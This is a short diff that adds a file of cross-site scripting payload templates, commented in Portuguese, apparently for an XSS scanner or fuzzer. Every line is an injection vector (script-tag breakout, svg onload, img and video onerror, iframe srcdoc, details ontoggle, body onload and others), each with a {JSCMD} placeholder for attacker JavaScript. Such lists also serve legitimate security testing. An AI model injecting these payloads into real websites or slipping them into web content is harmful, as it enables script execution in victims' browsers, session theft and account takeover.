@@ -1,0 +1,11 @@
+<!-- Fecha tag e injeta bloco script -->
+</script><script>{JSCMD}</script>
+<svg/onload={JSCMD}>
+<svg><script>{JSCMD}</script></svg>
+<iframe srcdoc="<script>{JSCMD}</script>"></iframe>
+<img src=x onerror="{JSCMD}">
+<details open ontoggle={JSCMD}></details>
+<marquee onstart={JSCMD}>x</marquee>
+<video src=x onerror={JSCMD}></video>
+<body onload={JSCMD}></body>
+<math><script>{JSCMD}</script></math>
